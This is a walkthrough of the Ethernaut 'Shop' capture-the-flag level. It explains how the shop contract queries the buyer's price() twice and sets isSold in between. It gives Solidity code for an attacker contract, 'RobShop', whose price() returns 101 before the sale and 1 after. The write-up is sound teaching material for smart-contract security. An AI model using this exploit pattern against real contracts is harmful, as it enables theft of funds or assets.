> Сan you get the item from the shop for less than the price asked?

This one should ring some bells if you've completed challenge 11, `Elevator`.

Breaking down the contract:
* High level, it logic for buying one item with `uint price == 100` and `bool isSold`
* It has a `buy()` function which interfaces with `Buyer`
  * It's important to note that `Buyer _buyer` does not implement the `Buyer` interface's `price()` method. We may have a way in.
* An if statement checks if the value returned by the interface's `price()` method is >= 100 and that the item hasn't been sold. 
  * `isSold` is then set to true before the price is retrieved yet again, maybe we can manipulate the price here...

## Solution

The solution framework here is simple. We create a malicious contract that implements the `Buyer` interface's `price()` method. Then, we manipulate the `isSold` variable to allow us to buy the item at a bargain.

1. In Remix, add the existing Ethernaut code and spin up a malicious contract - I'm calling mine `RobShop`
```javascript
// Buyer interface
// Shop contract

contract RobShop {}
```
2. We then add a function to call the `buy()` method on the Ethernaut contract
```javascript
contract RobShop {
    // _target will end up being our Ethernaut contract instance
    function rob(address _target) public {
        Shop(_target).buy();
    }
}
```
3. Implement a malicious `price()` function
```javascript
contract RobShop {
    // ...

    // implement the Buyer interface price method
    function price() public view returns (uint256) {
        // if isSold == true, price = 1, else price = 101
        return Shop(msg.sender).isSold ? 1 : 101;
    }
}
```
4. Compile and deploy the `RobShop` contract (make sure you're using the Injected Web3 environment). Then call `rob()` with your contract instance.